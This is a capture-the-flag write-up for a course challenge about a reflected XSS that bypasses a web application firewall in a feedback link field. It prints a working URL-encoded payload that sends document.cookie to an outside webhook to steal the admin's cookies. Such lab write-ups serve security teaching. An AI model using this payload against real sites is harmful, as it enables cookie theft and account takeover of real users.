# Challenge `Give me more than a simple WAF` writeup

- Vulnerability: What type of vulnerability is being exploited
  - Reflected XSS with WAF bypass.
- Where: Where is the vulnerability present
  - Field: “Link of the bug/feature request you want to report on”
- Impact: What results of exploiting this vulnerability
  - Execution of arbitrary JavaScript
  - Theft of user and admin cookies
  - Potential account takeover

## Steps to reproduce

1. Submit the following URL-encoded payload in the Feedback link field. For example: 
```js
http://ssof2526.challenges.cwte.me:25252/?search=%3Cbody%20onload%3Dalert(window.location%3D(%22https%3A%2F%2Fwebhook.site%2F67335a72-9738-4622-9218-2732119d2876%3Fcookie%3D%22%2Bdocument.cookie))%3E 
```
2. The onload event executes JavaScript when the page loads.
3. The admin’s cookies are sent to the attacker-controlled webhook.